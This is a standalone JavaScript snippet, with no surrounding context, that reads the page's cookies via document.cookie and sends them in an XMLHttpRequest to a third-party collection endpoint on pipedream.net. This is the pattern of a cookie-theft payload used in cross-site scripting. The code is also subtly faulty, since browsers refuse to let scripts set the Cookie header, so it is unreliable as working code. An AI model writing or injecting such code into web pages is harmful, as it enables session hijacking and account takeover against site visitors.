// set the cookies you want to submit
const cookies = document.cookie;

// create a new XHR object
const xhr = new XMLHttpRequest();

// set the URL of the third-party domain you want to request
const url = "https://eob6okuojuo3pb7.m.pipedream.net";

// set the HTTP method and URL
xhr.open("GET", url);

// set the cookies as a parameter in the request headers
xhr.setRequestHeader("Cookie", cookies);

// handle the response when it is received
xhr.onload = function() {
  if (xhr.status === 200) {
    console.log(xhr.responseText);
  }
};

// send the request
xhr.send();
